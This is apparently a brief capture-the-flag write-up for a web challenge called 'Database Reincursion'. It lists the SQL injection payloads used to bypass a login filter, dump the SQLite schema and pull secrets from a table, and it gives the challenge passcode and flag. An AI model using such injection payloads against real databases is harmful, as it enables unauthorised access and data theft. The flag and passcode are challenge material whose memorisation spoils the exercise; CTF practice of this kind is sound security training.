# 1. Database Reincursion
First day as an intern at Citadel Corp and i'm already making strides!
Got rid of that bulky unnecessary security system and implemented my own simple solution. 

## Solution:

- used sql injection `' UNION SELECT 1, 2,3 /*` to bypass filter
- '=0 LIMIT 13,1 /* to get to kiwi and got passcode ecSKsN7SES 
- found this payload `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master -- ` to get table schema and columns names
- ran `' UNION SELECT 1, 2, 3, secrets FROM CITADEL_ARCHIVE_2077-- ` got flag

## Flag:

```
nite{neVeR_9Onn4_57OP_WonDER1N9_1f_175_5ql_oR_5EKWeL}
```


